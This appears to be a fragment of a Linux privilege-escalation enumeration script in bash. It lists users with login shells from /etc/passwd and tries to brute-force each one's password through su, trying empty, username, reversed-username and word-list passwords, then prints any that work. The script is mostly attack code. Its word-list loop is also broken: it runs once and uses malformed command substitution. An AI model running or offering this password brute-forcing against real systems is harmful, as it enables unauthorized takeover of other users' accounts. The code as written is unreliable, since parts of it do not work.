#!/bin/bash

  
  

check_su_exists()

{

    EXISTS="$(command -v su 2>/dev/null || echo -n '')"

    error=$(echo "" | timeout 1 su $(whoami) -c whoami 2>&1)

  
    if [ "$EXISTS" ] && ! echo $error | grep -q "must be run from a terminal";

        then

        echo "1"

    fi

}

  

su_try ()

{

 SU_USER=$1

 PASSWD=$2

 trysu=$(echo "$PASSWD" | timeout 1 su $SU_USER -c whoami 2>/dev/null)

 if [ "$trysu" ]; then

 print_red_yellow "WORKS FOR $SU_USER PASSWORD:  $PASSWD"

 fi

}

  
  

su_brute()
{

    SU_USER=$1 # empty, login, reverse login

    su_try "$SU_USER" "" &

    su_try "$SU_USER" "$SU_USER" &

    su_try "$SU_USER" "$(echo $SU_USER | rev 2>/dev/null)" &

    for i_num in 2000; 
        do
        TEMP_PASSWD=$"echo $top200 | cut -d ' ' -f $i_num)"
        echo $TEMP_PASSWD
        su_try "$SU_USER" $TEMP_PASSWD &
        
        sleep 0.01
        done
    wait

}

  

print_2title "trying different passwords for other users"

CHECK=$(check_su_exists)

if [ "$CHECK" ];
    then
    SHELLERS=$(cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1)
    printf "%s\n" "$SHELLERS" | while read us;
    do
        echo " Bruteforcing user $us..."
        su_brute "$us"
    done

    else

    print_green "It's not possible to brute-force su."

fi
